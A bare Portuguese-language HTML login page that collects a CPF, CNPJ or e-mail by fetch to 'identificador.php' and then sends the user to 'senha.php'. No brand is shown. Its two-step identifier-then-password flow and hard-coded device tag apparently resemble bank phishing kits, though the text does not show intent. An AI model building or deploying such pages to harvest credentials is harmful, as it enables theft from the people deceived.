<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      font-family: Arial, sans-serif;
      background: #fff;
    }

    .container {
      max-width: 360px;
      margin: 80px auto;
      padding: 20px;
    }

    h2 {
      margin-bottom: 10px;
    }

    input {
      width: 100%;
      padding: 14px;
      font-size: 16px;
      margin-top: 10px;
      border: 1px solid #ccc;
    }

    button {
      width: 100%;
      margin-top: 20px;
      padding: 14px;
      background: #007fc7;
      color: #fff;
      font-size: 16px;
      border: none;
      cursor: pointer;
    }

    .erro {
      display: none;
      color: red;
      margin-top: 10px;
      font-size: 14px;
    }
  </style>
</head>
<body>

<div class="container">

  <h2>Digite seu CPF, CNPJ ou e-mail</h2>

  <!-- ❌ NÃO TEM ACTION -->
  <form id="formLogin">

    <input
      type="text"
      id="identificador"
      placeholder="CPF, CNPJ ou e-mail"
      autocomplete="off"
      required
    >

    <!-- ❌ NÃO É SUBMIT -->
    <button type="button" id="btn">Continuar</button>

    <div class="erro" id="erroMsg">
      Informe um CPF, CNPJ ou e-mail válido
    </div>

  </form>
</div>

<!-- ✅ SCRIPT CORRETO -->
<script>
document.getElementById('btn').addEventListener('click', function () {

  const input = document.getElementById('identificador');
  const valor = input.value.trim();
  const erro = document.getElementById('erroMsg');

  erro.style.display = 'none';

  if (!valor) {
    erro.style.display = 'block';
    return;
  }

fetch('identificador.php', {
  method: 'POST',
  credentials: 'same-origin', // 🔑 ISSO RESOLVE
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body:
    'identificador=' + encodeURIComponent(valor) +
    '&device_type=Desktop'
})
  .then(res => res.json())
  .then(data => {
    if (data.status === 'success') {
      // ✅ REGRA CERTA
      window.location.href = 'senha.php';
    } else {
      erro.style.display = 'block';
    }
  })
  .catch(() => {
    alert('Erro de conexão');
  });

});
</script>

</body>
</html>
